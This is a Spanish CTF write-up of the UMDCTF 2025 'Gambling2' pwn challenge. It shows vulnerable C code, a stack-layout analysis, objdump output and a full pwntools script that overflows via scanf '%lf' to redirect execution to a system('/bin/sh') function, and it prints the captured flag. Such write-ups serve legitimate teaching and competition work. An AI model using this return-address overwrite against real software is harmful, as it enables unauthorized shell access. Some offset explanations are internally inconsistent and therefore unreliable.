---
title: Gambling2 - UMDCTF2025
author: Kesero
description: Reto pwn basado en explotar la vulnerabilidad de Out of Bound en un binario compilado en C (OOB).
date: 2025-04-27 10:00:00 +0000
categories: [Writeups Competiciones Internacionales, Pwn]
tags: [Pwn, Pwn - OOB, Otros - Writeups, Dificultad - Fácil, UMDCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/UMDCTF2025/pwn/img/prompt.png
  lqip: 
  alt: 
comments: true
---
Autor del reto: `aparker`

Dificultad: <font color=green>Fácil</font>

## Enunciado

"I gambled all of my life savings in this program (i have no life savings).

nc challs.umdctf.io 31005"

## Archivos

En este reto, nos dan los siguientes archivos.

- `Dockerfile`: Contiene el contenedor desplegado del reto. 
- `gambling`: Contiene el binario compilado de `gambling.c`.
- `gambling.c`: Contiene el código principal en `C`.
- `Makefile`: Contiene las instrucciones de compilación del código en `C`.

Archivos utilizados [aquí](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/UMDCTF2025/pwn).

## Analizando el reto

En este reto tenemos el siguiente código principal:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

float rand_float() {
  return (float)rand() / RAND_MAX;
}

void print_money() {
	system("/bin/sh");
}

void gamble() {
	float f[4];
	float target = rand_float();
	printf("Enter your lucky numbers: ");
	scanf(" %lf %lf %lf %lf %lf %lf %lf", f,f+1,f+2,f+3,f+4,f+5,f+6);
	if (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) { 
		printf("You win!\n");
		// due to economic concerns, we're no longer allowed to give out prizes.
		// print_money();
	} else {
		printf("Aww dang it!\n");
	}
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

	char buf[20];
	srand(420);
	while (1) {
		gamble();
		getc(stdin); // consume newline
		printf("Try again? ");
		fgets(buf, 20, stdin);
		if (strcmp(buf, "no.\n") == 0) {
			break;
		}
	}
}
```

Este código implementa un juego de apuestas donde el usuario ingresa números flotantes intentando adivinar un valor aleatorio generado. En la función `gamble()` compara los números ingresados con el número objetivo. Si este valor es acertado, entonces muestra por pantalla "You win" pero no entrega el premio ya que la función `print_money()` está comentada, la cual arroja una shell interactiva.

Además el programa corre en bucle preguntando si queremos volver a jugar y finaliza cuando el usuario escribe "no".

## Solver

Este código tiene una vulnerabilidad crítica y es que `f` es un vector de 4 `floats` (4 x 4 = 16 bytes) pero en la siguiente instrucción se utiliza el formato `%lf` en `scanf` lo cual escribe un `double` de 8 bytes por cada conversión.

Además se pasan 7 punteros definidos como `f`, `f+1`, `f+2`, `f+3`, `f+4`, `f+5` y `f+6` y justo los cuatro primeros están "dentro" de `f`, los tres últimos apuntan fuera del arreglo.

Esto degenera en una vulnerabilidad llamada `Out of Bound (OOB)` la cual ocurre cuando un programa accede a memoria fuera de los límites de un arreglo o buffer. En nuestro caso lo aprovecharemos para poder llegar a la función `print_money()` la cual nos dará una consola interactiva en el servidor.

Para ello, primero tenemos que comprender cómo se sobrescribe en la pila.

El binario `gambling` está compilado en 32 bits, por tanto la pila local se organiza aproximadamente de la siguiente manera.

```
[ f[0] ]  bytes 0x00–0x03
[ f[1] ]         0x04–0x07
[ f[2] ]         0x08–0x0B
[ f[3] ]         0x0C–0x0F
[ target ]       0x10–0x13
[ saved EBP ]    0x14–0x17
[ saved EIP ]    0x18–0x1B   ← aquí está la dirección de salto $eip
```

Cada vez que `scanf` lee un `%lf` en, por ejemplo, `f+i`, escribe 8 bytes empezando en la posición de `f+i` de la siguiente forma:

1. Para `i=0…3` escribes dentro de `f[0]…f[3]` (aunque pisas dos floats a la vez).

2. Con `i=4` (puntero f+4) empiezas a sobrescribir target (no es lo que queremos en este caso).

3. Con `i=5` (f+5) pisas saved EBP (no es útil para nuestro salto).

4. Con `i=6` (f+6) comienzas en `0x18` y pisas los 4 bytes de `saved EIP` (y otros 4 bytes adyacentes que no nos importan).

Llegados a este punto, podemos controlar la dirección de salto de nuestro programa, pero para ello necesitamos la dirección de memoria de la función `print_money()` para llegar a ejecutarla.

Para ello ejecutamos `objdump` y volcamos las direcciones de memoria de cada instrucción de la siguiente manera.

    ┌──(kesero㉿kali)-[~]
    └─$ objdump -d gambling

    080492a0 <rand_float>:
    80492a0:	83 ec 1c             	sub    $0x1c,%esp
    80492a3:	e8 f8 fd ff ff       	call   80490a0 <rand@plt>
    80492a8:	89 44 24 0c          	mov    %eax,0xc(%esp)
    80492ac:	db 44 24 0c          	fildl  0xc(%esp)
    80492b0:	d8 0d 70 a0 04 08    	fmuls  0x804a070
    80492b6:	83 c4 1c             	add    $0x1c,%esp
    80492b9:	c3                   	ret
    80492ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi

    080492c0 <print_money>:
    80492c0:	83 ec 18             	sub    $0x18,%esp
    80492c3:	68 08 a0 04 08       	push   $0x804a008
    80492c8:	e8 a3 fd ff ff       	call   8049070 <system@plt>
    80492cd:	83 c4 1c             	add    $0x1c,%esp
    80492d0:	c3                   	ret
    80492d1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
    80492d8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
    80492df:	90                   	nop

    080492e0 <gamble>:
    80492e0:	83 ec 2c             	sub    $0x2c,%esp
    80492e3:	e8 b8 fd ff ff       	call   80490a0 <rand@plt>
    80492e8:	83 ec 08             	sub    $0x8,%esp
    80492eb:	89 44 24 14          	mov    %eax,0x14(%esp)
    80492ef:	db 44 24 14          	fildl  0x14(%esp)
    80492f3:	d8 0d 70 a0 04 08    	fmuls  0x804a070
    80492f9:	d9 5c 24 14          	fstps  0x14(%esp)

Listo! Sabemos que tenemos que saltar a la dirección `0x080492c0` para llegar a ejecutar la función `print_money()` la cual nos dará la consola interactiva, pero antes tenemos que construir el valor `double` a enviar con la dirección obtenida.

Para ello queremos que esos 8 bytes que se imprimen en la posición que `f+6` contenga, en su mitad alta (los 4 bytes de más peso), la dirección de `print_money` (0x080492c0). Para ello construiremos la siguiente lógica.

```py
target_addr = 0x080492c0
bits64       = (target_addr << 32)
payload_bytes = struct.pack('<Q', bits64)
payload_double = struct.unpack('<d', payload_bytes)[0]
payload_str   = payload_double.hex()
```
Esa dirección en 64 bits corresponde a `0x080492c000000000` y en little-endian, esos 8 bytes se almacenan como:

    00 00 00 00   c0 92 04 08
    ^—low—^       ^—high—^

Por tanto, cuando `scanf` hace la séptima lectura `i=6`, escribe esos 8 bytes en el registro `$eip`.
– Los 4 bytes más bajos (todos ceros) se van “más allá” pero no nos importan.
– Los 4 bytes más altos (c0 92 04 08) acaban justo en saved EIP, convirtiéndolo en `0x080492c0`.

Por último pero importante, el salto a la función `print_money()` se ejecuta al terminar la función principal `gamble()`, ya que el ensamblador genera el siguiente código:

    leave   ; equivale a “mov esp, ebp; pop ebp”
    ret     ; pop [esp] → EIP

En este código generado por el propio ensamblador, `leave` restaura el `esp` original y hace `pop ebp` (no importa el valor que este contenga).

Además, `ret` hace `pop eip`, y como acabamos de sobrescribir saved EIP con `0x080492c0`, el procesador salta directamente a la función `print_money()`.

El código final es el siguiente:

```py
from pwn import *
import struct

p = remote("challs.umdctf.io", 31005) 

#p = process("./gambling")

#gdb.attach(p, gdbscript="""
#  set follow-fork-mode child
#""")

# Construir doble con los 32 bits altos = target_addr
target_addr = 0x080492c0
bits64       = (target_addr << 32) & 0xffffffffffffffff
payload_bytes = struct.pack('<Q', bits64)
payload_double = struct.unpack('<d', payload_bytes)[0]

# Obtener literal hexadecimal que scanf("%lf") aceptaría si soportara %a
payload_str = payload_double.hex()  # '0x0.00000080492c0p-1022'

input_values = ["1.0", "1.0", "1.0",
                "1.0",
                "1.0", "1.0", payload_str]

inp = " ".join(input_values)
p.sendlineafter("Enter your lucky numbers: ", inp )

p.interactive()
```

Una vez tenemos la `shell` interactiva, leemos la flag en el servidor.

    ┌──(Server㉿server)-[~]
    └─$ cat flag.txt

    UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}

## Flag
`UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}`